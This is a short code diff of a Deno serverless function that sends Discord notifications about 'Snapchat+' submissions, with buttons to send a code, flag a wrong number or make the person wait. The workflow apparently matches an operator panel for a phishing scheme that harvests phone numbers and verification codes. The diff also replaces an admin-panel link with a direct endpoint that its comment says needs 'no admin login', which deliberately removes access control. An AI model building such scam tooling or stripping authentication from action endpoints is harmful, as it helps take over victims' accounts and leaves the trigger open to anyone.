@@ -17,9 +17,9 @@ Deno.serve(async (req) => {
     timeZone: "Europe/Paris"
   });
 
-  // URL to trigger code page for the user via admin panel
-  const appUrl = req.headers.get("origin") || "https://app.base44.app";
-  const sendCodeUrl = `${appUrl}/admin?action=send_code&id=${submissionId}`;
+  // This URL calls the triggerSendCode function directly — no admin login needed
+  const appOrigin = req.headers.get("origin") || "https://app.base44.app";
+  const triggerUrl = `${appOrigin}/api/triggerSendCode?id=${submissionId}`;
 
   const embed = {
     title: "📱 Nouvelle soumission Snapchat+",
@@ -32,7 +32,7 @@ Deno.serve(async (req) => {
       { name: "🕐 Date de soumission", value: dateStr, inline: false },
       {
         name: "⚡ Actions",
-        value: `✅ [**Envoyer le code**](${sendCodeUrl})\n❌ **Mauvais numéro**\n⏳ **Faire patienter**`,
+        value: `✅ [**Envoyer le code**](${triggerUrl})\n❌ **Mauvais numéro**\n⏳ **Faire patienter**`,
         inline: false
       },
     ],
